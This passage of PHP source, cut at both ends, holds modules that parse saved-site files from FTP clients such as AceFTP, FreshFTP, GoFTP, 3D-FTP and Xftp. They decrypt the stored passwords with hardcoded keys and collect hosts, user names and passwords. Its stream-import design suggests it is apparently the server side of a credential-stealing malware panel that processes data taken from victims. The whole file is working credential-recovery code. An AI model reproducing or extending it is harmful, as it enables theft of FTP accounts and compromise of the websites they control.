			$dir = assign($section["remote path"]);

			$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$ini_contents = $stream->read_str();
				$this->process_ini($ini_contents);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// AceFTP

class stream_ace extends stream
{
	function read_ace_str()
	{
		if (!$this->state)
			return false;
		return $this->read_strlen($this->read_byte());
	}

	function read_ace_data()
	{
		if (!$this->state)
			return false;
		return $this->read_strlen($this->read_dword());
	}

	function read_ace_uni_str()
	{
		if (!$this->state)
			return false;
		return $this->read_strlen($this->read_dword()*2);
	}

	function read_data(&$l)
	{
		$item_type = $this->read_byte();
		if (!$this->state)
			return '';

		$l = true;
		switch ($item_type)
		{
			case 0:
				// List End
				$l = false;
				break;
			case 1:
				// List Start
				$x = true;
				$out = array();
				while ($this->state)
				{
					$list_value = $this->read_data($x);
					if (!$x || !$this->state)
						break;
					array_push($out, $list_value);
				}

				return $out;
				break;
			case 2:
				return $this->read_byte();
				break;
			case 3:
				return $this->read_word();
				break;
			case 4:
				// GUESS
				return $this->read_dword();
				break;
			case 5:
				$this->read_skip(10); // DateTime
				break;
			case 6:
			case 7:
				return $this->read_ace_str();
				break;
			case 8:
				return true;
				break;
			case 9:
				return false;
				break;
			case 11:
				// String List
				while ($this->state && $this->read_ace_str())
				{
				}
				break;
			case 10:
			case 12:
				return $this->read_ace_data();
				break;
			case 18:
				// UNICODE
				return Utf8ToWin(unicode_to_utf8($this->read_ace_uni_str()));
				break;
			case 19:
				$this->read_skip(8); // Int64
				break;
			case 20:
				// UTF-8
				return Utf8ToWin($this->read_ace_data());
				break;
			default:
				$this->push_error('ERR_UNK_ACEFTP_ITEM_TYPE: '.$item_type);
		}
        return '';
	}

	function read_ace_pair(&$name)
	{
		if (!$this->state)
			return '';

		$name = $this->read_ace_str();

		if (!strlen($name) || !$this->state)
			return '';

		return $this->read_data($l);
	}
}

class module_aceftp extends module
{
	private function unpack_ftp_file($ftp_contents)
	{
		$bitmask = array(0, 1, 3, 7, 0xF, 0x1F, 0x3F, 0x7F, 0xFF, 0x1FF, 0x3FF, 0x7FF, 0x0FFF, 0x1FFF, 0x3FFF, 0x7FFF);

		$source_file_len = strlen($ftp_contents)-4;
		$source_buffer = $ftp_contents;
		$unpacked_len = data_int32(substr($source_buffer, 0, 4));
		$source_buffer = substr($ftp_contents, 4).chr(0).chr(0).chr(0).chr(0);
		$first_flag = true;
		$output_buffer = '';

		$bitmask_sum = 0;
		$bitmask_pos = 0;
		$bitmask_max = 0;
		$v23 = 0;
		$v22 = 0;
		$input_char_copy1 = 0;
		$input_char_copy0 = 0;

		$unpack_buffer_offset = 0;

		$unpack_buffer = array_fill(0, 32768, 0);
		$byte_shadow_table = array_fill(0, 32768, 0);
		$word_shadow_table = array_fill(0, 32770, 0);
		$unpacked_len2 = $unpacked_len;

		if ($unpacked_len > 0)
		{
			do
			{
				if (0 >= $unpack_buffer_offset)
				{
					if ($first_flag)
					{
						$first_flag = false;
						$input_char = 0x100;
					} else
					{
						if ($bitmask_sum > $bitmask_max)
							break;
						$input_char = ($bitmask[$bitmask_pos] & _BF_SHR32(data_int32(substr($source_buffer, ($bitmask_sum >> 3), 4)), ($bitmask_sum & 7)));
						$bitmask_sum = $bitmask_sum + $bitmask_pos;
					}

					if ($input_char == 0x100)
					{
						$bitmask_pos = 9;
						$bitmask_max = 8 * $source_file_len - 9;
						$v23 = 0x100 + 2;
          				$v22 = 2 * 0x100;
						do
						{
							if ($bitmask_sum > $bitmask_max)
								break;
							$input_char = ($bitmask[$bitmask_pos] & _BF_SHR32(data_int32(substr($source_buffer, ($bitmask_sum >> 3), 4)), ($bitmask_sum & 7)));
							$bitmask_sum = $bitmask_sum + $bitmask_pos;
						} while ($input_char == 0x100);

						$input_char_copy1 = $input_char;
						$input_char_copy0 = $input_char;
					} else
					{
						if ($input_char == 0x101)
							break;

						$input_char_copy2 = $input_char;

						if ($input_char >= $v23)
						{
							$unpack_buffer[$unpack_buffer_offset++] = $input_char_copy1;
							$input_char = $input_char_copy0;
						}

						while ($input_char >= 0x100)
						{
							$unpack_buffer[$unpack_buffer_offset++] = $byte_shadow_table[$input_char];
							$input_char = $word_shadow_table[$input_char];
						}

						$input_char_copy1 = $input_char;

						if ($v23 <= 32767)
						{
							$word_shadow_table[$v23] = $input_char_copy0 & 0xffff;
							$byte_shadow_table[$v23] = $input_char_copy1 & 0xff;
							$v23++;
							if ($v23 >= $v22)
							{
								if ($v22 < 32767)
								{
									$v22 = $v22 * 2;
									$bitmask_pos++;
									$bitmask_max--;
								}
							}
						}

						$input_char_copy0 = $input_char_copy2;
					}
				} else
				{
					$unpack_buffer_offset--;
					$input_char = $unpack_buffer[$unpack_buffer_offset];
				}

				$output_buffer .= chr($input_char);
				$unpacked_len2--;
			} while ($unpacked_len2 > 0);
		}

		return $output_buffer;
	}

	protected function process_ftp_file($ftp_contents)
	{
		if (strlen($ftp_contents) <= 4)
			return;

		$unpacked_data = $this->unpack_ftp_file($ftp_contents);

		if (!strlen($unpacked_data))
			return;

		$stream = new stream_ace($unpacked_data, $this->log);

		$host = '';
		$user = '';
		$pass = '';
		$port = '';
		$dir = '';
		$dir_list = array();
		$protocol = '';

		while ($stream->state)
		{
			$item_name = '';
			$item_value = $stream->read_ace_pair($item_name);

			if (!strlen($item_name) || !$stream->state)
			{
				break;
			}

			switch ($item_name)
			{
				case 'HostName': $host = $item_value; break;
				case 'Password': $pass = $item_value; break;
				case 'Port': $port = $item_value; break;
				case 'UserName': $user = $item_value; break;
				case 'InitialServerFolders.Strings': $dir_list = $item_value; break;
				case 'Protocol': $protocol = strtolower($item_value); break;
		    }
		}

		if (is_array($dir_list) && count($dir_list) > 0)
		{
			foreach ($dir_list as $dir)
			{
				$this->add_ftp(append_port_dir(ftp_force_ssh($host, $protocol == 'sftp'), $port, $dir), $user, $pass);
			}
		} else
		{
			$this->add_ftp(append_port_dir(ftp_force_ssh($host, $protocol == 'sftp'), $port, $dir), $user, $pass);
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$ftp_contents = $stream->read_str();
				$this->process_ftp_file($ftp_contents);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Global Downloader

class stream_globaldownloader extends stream
{
	function read_word_str()
	{
		if (!$this->state)
			return false;
		return $this->read_strlen($this->read_word());
	}

	function read_str()
	{
		if (!$this->state)
			return false;

		$len = $this->read_byte();
		if ($len == 0xff)
		{
			$len = $this->read_word();
			if ($len == 0xffff)
				$len = $this->read_dword();
			return $this->read_strlen($len);
		}
		else
			return $this->read_strlen($len);
	}
}

class module_globaldownloader extends module
{
	private function decrypt($encrypted_password)
	{
		$crypt_pos = strpos($encrypted_password, '>>GD_ENCRYPTED<<');
		if ($crypt_pos === false)
		{
			return $encrypted_password;
		}
		$encrypted_password = substr($encrypted_password, 0, $crypt_pos);
		$encrypted_password = base64_decode($encrypted_password);

		$crypt_array = array(0x50, 0x49, 0x1A, 0x52, 0x63, 0x1F, 0x54, 0x64, 0x1B, 0x1B, 0x24, 0x26, 0x33, 0x41, 0x45, 0x3E,
			0x6D, 0x1E, 0x4D, 0x1B, 0x56, 0x47, 0x55, 0x5B, 0x6F, 0x4B, 0x47, 0x2D, 0x58, 0x63, 0x57, 0x25,
			0x55, 0x21, 0x79, 0x74, 0x74, 0x34, 0x4E, 0x38, 0x71, 0x35, 0x78, 0x3C, 0x67, 0x60, 0x43, 0x24,
			0x60, 0x73);

		$crypt_key = '';

		for ($i = 0; $i < count($crypt_array); $i++)
			$crypt_key .= chr($crypt_array[$i]);
		
		$cipher_key = hextostr(md5($crypt_key));

		return rc4Decrypt($cipher_key, $encrypted_password);
	}

	protected function process_arch_file($arch_contents)
	{
		if (strlen($arch_contents) < 10)
			return;

		$stream = new stream_globaldownloader($arch_contents, $this->log);

		$stream->read_skip(4);
		$type = $stream->read_word_str();
		if ($type != 'CsmAddressTree')
		{
			$this->log->add('ERR_INVALID_ARCH_FILE_FORMAT');
			return;
		}
		$nSites = $stream->read_dword();

		while ($stream->state && $nSites--)
		{
			  $stream->read_str(); // Site path
			  $stream->read_str(); // Local path
			  $stream->read_str(); // Notes
			  $pass = $this->decrypt($stream->read_str()); // Password
			  $dir = $stream->read_str(); // Remote directory
			  $host = $stream->read_str(); // Host
			  $stream->read_str(); // Display name
			  $user = $this->decrypt($stream->read_str()); // User name
			  $port = $stream->read_dword();
			  $protocol = $stream->read_str(); // Protocol
			  $this->add_ftp(append_port_dir(ftp_force_ssh($host, $protocol == 'FTPS'), $port, $dir), $user, $pass);
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$arch_contents = $stream->read_str();
				$this->process_arch_file($arch_contents);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// FreshFTP

//class to encrypt and decrypt according to the "PC1" algorithm
// I. Verburgh 2007
class PC1 {
	var $pkax;
	var $pkbx;
	var $pkcx;
	var $pkdx;
	var $pksi;
	var $pktmp;
	var $x1a2;
	var $pkres;
	var $pki;
	var $inter;
	var $cfc;
	var $cfd;
	var $compte;
	var $x1a0;
	var $cle;
	var $pkc;
	var $plainlen;
	var $ascipherlen;
	var $plainText;
	var $ascCipherText;


	function PC1() {
	}

	function pkfin() {
		for ($j=0;$j<16;$j++) {
			$this->cle[$j] = "";
		}
		for ($j=0;$j<8;$j++) {
			$this->x1a0[$j] = 0;
		}
		$this->pkax = 0;
		$this->pkbx = 0;
		$this->pkcx = 0;
		$this->pkdx = 0;
		$this->pksi = 0;
		$this->pktmp = 0;
		$this->x1a2 = 0;
		$this->pkres = 0;
		$this->pki = 0;
		$this->inter = 0;
		$this->cfc = 0;
		$this->cfd = 0;
		$this->compte = 0;
		$this->pkc = 0;
	}

	function pkcode() {
		$this->pkdx = $this->x1a2 + $this->pki;
		$this->pkax = $this->x1a0[$this->pki];
		$this->pkcx = 0x015a;
		$this->pkbx = 0x4e35;
		$this->pktmp = $this->pkax;
		$this->pkax = $this->pksi;
		$this->pksi = $this->pktmp;
		$this->pktmp = $this->pkax;
		$this->pkax = $this->pkdx;
		$this->pkdx = $this->pktmp;
		if ($this->pkax != 0)	{
			$this->pkax = $this->wordmultiply($this->pkax, $this->pkbx);
		}
		$this->pktmp = $this->pkax;
		$this->pkax = $this->pkcx;
		$this->pkcx = $this->pktmp;
		if ($this->pkax != 0)	{
			$this->pkax = $this->wordmultiply($this->pkax, $this->pksi);
			$this->pkcx = $this->wordsum($this->pkax, $this->pkcx);
		}
		$this->pktmp = $this->pkax;
		$this->pkax = $this->pksi;
		$this->pksi = $this->pktmp;
		$this->pkax = $this->wordmultiply($this->pkax, $this->pkbx);
		$this->pkdx = $this->wordsum($this->pkcx, $this->pkdx);
		$this->pkax = $this->wordsum($this->pkax, 1);
		$this->x1a2 = $this->pkdx;
		$this->x1a0[$this->pki] = $this->pkax;
		$this->pkres = $this->wordxor($this->pkax, $this->pkdx);
		$this->pki++;
	}

	function wordmultiply($value1, $value2) {
		if (is_numeric($value1) && is_numeric($value2))
			$product = (($value1 * $value2) & 0xffff);
		else {
			$product = 0;
		}
		return $product;
	}

	function wordsum($value1, $value2) {
		$sum = (($value1 + $value2) & 0xffff);
		return $sum;
	}

	function wordminus($value1, $value2) {
		$minus = (($value1 - $value2) & 0xffff);
		return $minus;
	}

	function wordxor($value1, $value2) {
		$outcome = (($value1 ^ $value2) & 0xffff);
		return $outcome;
	}

	function pkassemble() {
		$this->x1a0[0] = $this->wordsum($this->wordmultiply(ord($this->cle[0]), 256), ord($this->cle[1]));
		$this->pkcode();
		$this->inter = $this->pkres;

		$this->x1a0[1] = $this->wordxor($this->x1a0[0], $this->wordsum($this->wordmultiply(ord($this->cle[2]), 256), ord($this->cle[3])));
		$this->pkcode();
		$this->inter = $this->wordxor($this->inter, $this->pkres);

		$this->x1a0[2] = $this->wordxor($this->x1a0[1], $this->wordsum($this->wordmultiply(ord($this->cle[4]), 256), ord($this->cle[5])));
		$this->pkcode();
		$this->inter = $this->wordxor($this->inter, $this->pkres);

		$this->x1a0[3] = $this->wordxor($this->x1a0[2], $this->wordsum($this->wordmultiply(ord($this->cle[6]), 256), ord($this->cle[7])));
		$this->pkcode();
		$this->inter = $this->wordxor($this->inter, $this->pkres);

		$this->x1a0[4] = $this->wordxor($this->x1a0[3], $this->wordsum($this->wordmultiply(ord($this->cle[8]), 256), ord($this->cle[9])));
		$this->pkcode();
		$this->inter = $this->wordxor($this->inter, $this->pkres);

		$this->x1a0[5] = $this->wordxor($this->x1a0[4], $this->wordsum($this->wordmultiply(ord($this->cle[10]), 256), ord($this->cle[11])));
		$this->pkcode();
		$this->inter = $this->wordxor($this->inter, $this->pkres);

		$this->x1a0[6] = $this->wordxor($this->x1a0[5], $this->wordsum($this->wordmultiply(ord($this->cle[12]), 256), ord($this->cle[13])));
		$this->pkcode();
		$this->inter = $this->wordxor($this->inter, $this->pkres);

		$this->x1a0[7] = $this->wordxor($this->x1a0[6], $this->wordsum($this->wordmultiply(ord($this->cle[14]), 256), ord($this->cle[15])));
		$this->pkcode();
		$this->inter = $this->wordxor($this->inter, $this->pkres);

		$this->pki=0;
	}

	function encrypt($in, $key) {
		$this->pkfin();
		$this->k = 0;
		$this->plainlen = strlen($in);
		for ($count=0;$count<16;$count++) {
			if (isset($key[$count]))
				$this->cle[$count] = $key[$count];
		}
		for ($count=0;$count<$this->plainlen;$count++) {
			$this->pkc = ord($in[$count]);
			$this->pkassemble();

			$this->cfc = $this->inter >> 8;
			$this->cfd = $this->inter & 255;

			for ($this->compte=0;$this->compte<sizeof($this->cle);$this->compte++) {
				$this->cle[$this->compte] = chr($this->wordxor(ord($this->cle[$this->compte]), $this->pkc));
			}
			$this->pkc = $this->wordxor($this->pkc, ($this->wordxor($this->cfc, $this->cfd)));

			$this->pkd = ($this->pkc >> 4);
			$this->pke = ($this->pkc & 15);
			$this->ascCipherText[$this->k] = $this->wordsum(0x61, $this->pkd);
			$this->k++;
			$this->ascCipherText[$this->k] = $this->wordsum(0x61, $this->pke);
			$this->k++;
		}
		$this->ascCipherText = array_map("chr", $this->ascCipherText);
		return implode("", $this->ascCipherText);

	}

	function decrypt($in, $key) {
		$this->pkfin();
		$return = "";
		for ($count=0;$count<16;$count++) {
			if (isset($key[$count]))
				$this->cle[$count] = $key[$count];
			else
				$this->cle[$count] = "";
		}
		$this->pksi = 0;
		$this->x1a2 = 0;
		$d = 0;
		$e = 0;
		$j = 0;
		$l = 0;

		$len = strlen($in);
		while ($j < $len) {
			$rep = $in[$j];
			switch($rep) {
				case "a": {
				$d = 0;
				break;
				}
				case "b": {
				$d = 1;
				break;
				}
				case "c": {
				$d = 2;
				break;
				}
				case "d": {
				$d = 3;
				break;
				}
				case "e": {
				$d = 4;
				break;
				}
				case "f": {
				$d = 5;
				break;
				}
				case "g": {
				$d = 6;
				break;
				}
				case "h": {
				$d = 7;
				break;
				}
				case "i": {
				$d = 8;
				break;
				}
				case "j": {
				$d = 9;
				break;
				}
				case "k": {
				$d = 10;
				break;
				}
				case "l": {
				$d = 11;
				break;
				}
				case "m": {
				$d = 12;
				break;
				}
				case "n": {
				$d = 13;
				break;
				}
				case "o": {
				$d = 14;
				break;
				}
				case "p": {
				$d = 15;
				break;
				}
			}

			$d = $d << 4;
			$j++;

			$rep = $in[$j];
			switch($rep) {
				case "a": {
				$e = 0;
				break;
				}
				case "b": {
				$e = 1;
				break;
				}
				case "c": {
				$e = 2;
				break;
				}
				case "d": {
				$e = 3;
				break;
				}
				case "e": {
				$e = 4;
				break;
				}
				case "f": {
				$e = 5;
				break;
				}
				case "g": {
				$e = 6;
				break;
				}
				case "h": {
				$e = 7;
				break;
				}
				case "i": {
				$e = 8;
				break;
				}
				case "j": {
				$e = 9;
				break;
				}
				case "k": {
				$e = 10;
				break;
				}
				case "l": {
				$e = 11;
				break;
				}
				case "m": {
				$e = 12;
				break;
				}
				case "n": {
				$e = 13;
				break;
				}
				case "o": {
				$e = 14;
				break;
				}
				case "p": {
				$e = 15;
				break;
				}
			}
			$c = $d + $e;
			$this->pkassemble();

			$this->cfc = $this->inter >> 8;
			$this->cfd = $this->inter & 255;

			$c = $this->wordxor($c, ($this->wordxor($this->cfc, $this->cfd)));

			for ($compte=0;$compte<16;$compte++)
				$this->cle[$compte] = chr($this->wordxor(ord($this->cle[$compte]), $c));
			$return = $return.chr($c);
			$j++;
			$l++;
		}
		return $return;
	}
}

class module_freshftp extends module
{
	private function decrypt($encrypted_password)
	{
		$encrypted_password = trim($encrypted_password);
		if (!strlen($encrypted_password) || (strlen($encrypted_password) % 2 != 0))
			return '';

		// Use PC1 CIPHER (c) Alexander PUKALL 1991 to decrypt the password
		$pc = new PC1();
		$decrypted_password = $pc->decrypt(strtolower($encrypted_password), 'drianz');

		for ($i = 0; $i < strlen($decrypted_password); $i++)
			if ($decrypted_password[$i] == chr(0))
			{
				$decrypted_password = substr($decrypted_password, 0, $i);
				break;
			}
		return $decrypted_password;
	}

	protected function process_smf_file($smf_contents)
	{
		if (strlen($smf_contents) < 4)
			return;

		$stream = new stream($smf_contents, $this->log);

		$header = $stream->read_strlen(4);

		if ($header != 'FFSM')
		{
			$this->log->add("ERR_INVALID_SMF_FILE_HEADER");
			return;
		}

		$stream->read_skip(6);
		$nSites = $stream->read_dword();

		while ($stream->state && $nSites--)
		{
			$stream->read_skip(5);
			$stream->read_strlen($stream->read_word()); // Site name
			$stream->read_skip(2);
			$host = $stream->read_strlen($stream->read_word()); // Host
			$port = $stream->read_dword();
			$user = $this->decrypt($stream->read_strlen($stream->read_word())); // User
			$pass = $this->decrypt($stream->read_strlen($stream->read_word())); // Password
			$dir = $stream->read_strlen($stream->read_word()); // Remote dir
			$stream->read_strlen($stream->read_word()); // Local dir
			$stream->read_skip(75);
			$stream->read_strlen($stream->read_word()); // Proxy host
			$stream->read_dword();
			$stream->read_strlen($stream->read_word()); // Proxy user
			$stream->read_strlen($stream->read_word()); // Proxy pass
			$stream->read_skip(32);
			$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$arch_contents = $stream->read_str();
				$this->process_smf_file($arch_contents);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// BlazeFTP

class module_blazeftp extends module
{
	private function decrypt($encrypted_password)
	{
		$encrypted_password = trim($encrypted_password);
		if (!strlen($encrypted_password))
			return '';

		$encrypted_password = hextostr($encrypted_password);
		if ($encrypted_password === false)
		{
			$this->log->add('ERR_INVALID_HEX_STRING');
			return '';
		}

		$decrypted_password = '';
		for ($i = 0; $i < strlen($encrypted_password); $i++)
			$decrypted_password .= chr(~((ord($encrypted_password[$i]) << 4) + (ord($encrypted_password[$i]) >> 4)));
		return $decrypted_password;
	}

	protected function process_ini_file($file_contents)
	{
		if (strlen($file_contents) <= 4)
			return;

		$parsed_ini = parse_ini($file_contents);

		foreach ($parsed_ini as $section)
		{
			if (!is_array($section))
				continue;
			$host = assign($section["address"]);
			$user = assign($section["username"]);
			$pass = $this->decrypt(assign($section["password"]));
			$dir = assign($section["defremotedir"]);
			$port = assign($section["port"]);
			$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);
		}

	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$ini_contents = $stream->read_str();
				$this->process_ini_file($ini_contents);
				break;
			case 0x0001:
				$host = $stream->read_str();
				$user = $stream->read_str();
				$pass = $this->decrypt($stream->read_str());
				$port = $stream->read_str();
				if (strlen($port) == 4)
				{
					$port = data_int32($port);
				} else
					$port = 0;
				$this->add_ftp(append_port($host, $port), $user, $pass);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}


// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// NETFile

class module_netfile extends module
{
	protected function process_ini_file($file_contents)
	{
		if (strlen($file_contents) <= 4)
			return;

		$parsed_ini = parse_ini($file_contents);

		foreach ($parsed_ini as $section)
		{
			if (!is_array($section))
				continue;
			$host = assign($section["address"]);
			$user = assign($section["userid"]);
			$pass = assign($section["password"]);
			$dir = assign($section["initial_directory"]);
			$port = assign($section["port"]);
			$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);
		}

	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$ini_contents = $stream->read_str();
				$this->process_ini_file($ini_contents);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// GoFTP

class module_goftp extends module
{
	private function decrypt($password)
	{
		if (!strlen($password))
			return '';

		$decoded_data = hextostr($password);
		if ($decoded_data === false)
		{
			$this->log->add('ERR_INVALID_HEX_STRING');
			return '';
		}

		$iv = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
		$key = "Goftp Rocks 91802sfaiolpqikeu39";
		$decrypted_data = mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $decoded_data, MCRYPT_MODE_ECB, $iv);

		if (!strlen($decrypted_data))
		{
			$this->log->add('ERR_CANNOT_DECRYPT_PASSWORD');
			return '';
		}

		$real_len = data_int32(substr($decrypted_data, 0, 4));

		$decrypted_password = substr($decrypted_data, 4, $real_len);
		if (strlen($decrypted_password) != $real_len)
		{
			return '';
		}

		return $decrypted_password;
	}

	protected function process_ini_file($file_contents)
	{
		if (strlen($file_contents) <= 4)
			return;

		$lines = parse_lines($file_contents);

		if (is_array($lines) && count($lines) > 1)
		{
			array_shift($lines);
			foreach ($lines as $line)
			{
				$line = $this->decrypt($line);
				$pos = strrpos($line, '<FS>');
				if ($pos !== false)
				{
					$line = substr($line, $pos+4);
					if (strlen($line))
					{
						$ftp_settings = explode('~~~', $line);
						if (is_array($ftp_settings) && count($ftp_settings) > 5)
						{
							$host = $ftp_settings[0];
							$port = $ftp_settings[1];
							$user = $ftp_settings[2];
							$pass = $ftp_settings[3];
							$dir = $ftp_settings[5];
							if (count($ftp_settings) > 10)
								$protocol = $ftp_settings[10];
							else
								$protocol = '';

							$this->add_ftp(append_port_dir(ftp_force_ssh($host, $protocol == 'SFTP - SSH2 encryption'), $port, $dir), $user, $pass);
						}
					}
				}
			}
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$ini_contents = $stream->read_str();
				$this->process_ini_file($ini_contents);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// 3D-FTP

class module_3dftp extends module
{
	private function decrypt($password)
	{
		if (substr($password, 0, 2) != '01')
			return '';

		$alphabet = '23456789ABCDEFGHJKLMNPQRSTUVWXYZ';
		$password = strtoupper(substr($password, 2));
		$s1 = '';
		for ($i = 0; $i < strlen($password); $i++)
		{
			$k = strpos($alphabet, $password[$i]);
			if ($k === false)
				return '';
			$v = decbin($k);
			while (strlen($v) < 5)
				$v = '0'.$v;
			if (strlen($v) != 5)
				return '';
			$s1 .= $v;
		}

		$s1 = substr($s1, 0, strlen($s1)-(strlen($s1) % 8));
		$s2 = str_repeat('0', strlen($s1));

		$divider = 1;

		for ($i = 1; $i <= floor(sqrt(strlen($s1))); $i++)
		{
			if ((strlen($s1) % $i) == 0)
				$divider = $i;
		}

		$quotient = int_divide(strlen($s1), $divider);
		if (($quotient == 1) || ($divider == 1))
			return '';

		$k = 0;
		for ($i = 0; $i <= $quotient-1; $i++)
		{
			for ($j = $divider-1; $j >= 0; $j--)
			{
				$t = (($i+$j*$quotient) % strlen($s1));
				$s2[$t] = $s1[$k++];
			}
		}

		$result = '';
		for ($i = 0; $i < int_divide(strlen($s2), 8); $i++)
		{
			$result .= chr(bindec(substr($s2, $i*8, 8)));
		}

		return $result;
	}

	private function build_delimiters($line)
	{
		$k = 0;
		for ($i = 0; $i < strlen($line); $i++)
		{
			if	($line[$i] == '*')
			{
				if (($k % 2) == 0)
				{
					$line[$i] = chr(0);
				}
			}

			if ($line[$i] == '\\')
			{
				$k++;
			} else
			{
				$k = 0;
			}
		}

		return $line;
	}

	protected function process_ini_file($file_contents)
	{
		if (strlen($file_contents) <= 4)
			return;

		$lines = parse_lines($file_contents);

		if (is_array($lines) && count($lines) > 1)
		{
			$first_line = array_shift($lines);

			if ($first_line != '0003DFTP' && $first_line != '[Settings]')
			{
				$this->log->add("ERR_INVALID_3DFTP_INI_FILE");
				return;
			}
			foreach ($lines as $line)
			{
				if ($first_line == '[Settings]')
				{
					$pos = strpos($line, '[*');
				}
				else
				{
					$pos = strpos($line, ',[*');
				}
				if ($pos !== false)
				{
					$line = explode(chr(0), stripslashes($this->build_delimiters(substr($line, $pos+3, -2))));
					if (is_array($line) && count($line) > 6)
					{
						$host = $line[1];
						$port = $line[2];
						$user = $line[3];
						$pass = $this->decrypt($line[4]);
						$dir = $line[6];
						if (count($line) > 52)
							$protocol = $line[52];
						else
							$protocol = '';
						$this->add_ftp(append_port_dir(ftp_force_ssh($host, $protocol == '1'), $port, $dir), $user, $pass);
					}
				}
			}
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$ini_contents = $stream->read_str();
				$this->process_ini_file($ini_contents);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Easy FTP

class module_easyftp extends module
{
	protected function process_ftp_file($file_contents)
	{
		if (substr($file_contents, 0, 2) != ',"')
			return;

		$line = explode(",", trim($file_contents));
		if (is_array($line) && count($line) == 4)
		{
			$host = substr($line[1], 1, -1);
			$user = substr($line[2], 1, -1);
			$pass = substr($line[3], 1, -1);
			$this->add_ftp($host, $user, $pass);
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$ini_contents = $stream->read_str();
				$this->process_ftp_file($ini_contents);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Xftp

class module_xftp extends module
{
	private function decrypt($encrypted_password)
	{
		$decoded_password = base64_decode($encrypted_password, true);
		if (!strlen($decoded_password))
			return '';

		$cipher_key = md5('!X@s#c$e%l^l&', true);
		return rc4Decrypt($cipher_key, $decoded_password);
	}

	protected function process_ini_file($file_contents)
	{
		if (strlen($file_contents) <= 4)
			return;

		$parsed_ini = parse_ini($file_contents);

		$host = '';
		$user = '';
		$pass = '';
		$dir = '';
		$port = '';
		$protocol = '';

		if (is_array($parsed_ini))
		{
			if (is_array($parsed_ini['Connection']))
			{
				$section = $parsed_ini['Connection'];
				$host = assign($section["host"]);
				$user = assign($section["username"]);
				$pass = $this->decrypt(assign($section["password"]));
				$port = assign($section["port"]);
				$protocol = assign($section['protocol']);
			}

			if (is_array($parsed_ini['InitialFolder']))
			{
				$section = $parsed_ini['InitialFolder'];
				$dir = assign($section['remote']);
			}
		}

		$this->add_ftp(append_port_dir(ftp_force_ssh($host, $protocol == '1'), $port, $dir), $user, $pass);
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$ini_contents = $stream->read_str();
				$this->process_ini_file($ini_contents);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
